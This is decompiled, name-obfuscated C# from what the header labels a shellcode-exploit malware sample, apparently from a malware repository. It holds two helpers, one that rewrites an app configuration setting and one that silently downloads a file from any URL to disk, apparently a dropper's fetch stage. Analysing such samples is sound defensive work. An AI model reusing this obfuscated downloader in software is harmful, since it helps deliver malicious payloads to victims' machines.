// Decompiled with JetBrains decompiler
// Type: 991059796994.580277262990
// Assembly: 308586033544, Version=1.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: CD78F8E3-E5F9-41CF-8142-5EDBF93F1FF3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-18bddfc40d40212cb2c9881929e98eb6ea1c5b6c4bd93f9aaeb774311da4a6c9.exe

using \u003170110655485;
using System;
using System.Configuration;
using System.IO;
using System.Net;

namespace \u003991059796994
{
  public static class \u003580277262990
  {
    public static void \u003822528814068(string _param0, string _param1)
    {
      if (string.IsNullOrWhiteSpace(_param0))
        throw new ArgumentNullException("key");
      System.Configuration.Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
      configuration.AppSettings.Settings[_param0].Value = _param1;
      configuration.Save(ConfigurationSaveMode.Modified);
      ConfigurationManager.RefreshSection("appSettings");
    }

    public static void \u003071983215550(string _param0, string _param1)
    {
      if (string.IsNullOrWhiteSpace(_param0))
        return;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
      httpWebRequest.UserAgent = \u003616327158267.\u003245197634709;
      httpWebRequest.AllowAutoRedirect = true;
      httpWebRequest.KeepAlive = false;
      int totalMilliseconds = (int) TimeSpan.FromMinutes(10.0).TotalMilliseconds;
      httpWebRequest.Timeout = totalMilliseconds;
      httpWebRequest.ReadWriteTimeout = totalMilliseconds;
      using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
      {
        using (Stream responseStream = response.GetResponseStream())
        {
          if (responseStream == null)
            return;
          using (FileStream fileStream = new FileStream(_param1, FileMode.Create, FileAccess.Write, FileShare.None))
          {
            byte[] buffer = new byte[8192];
            int length = buffer.Length;
            int count;
            while ((count = responseStream.Read(buffer, 0, length)) > 0)
            {
              fileStream.Write(buffer, 0, count);
              fileStream.Flush();
            }
          }
        }
      }
    }
  }
}
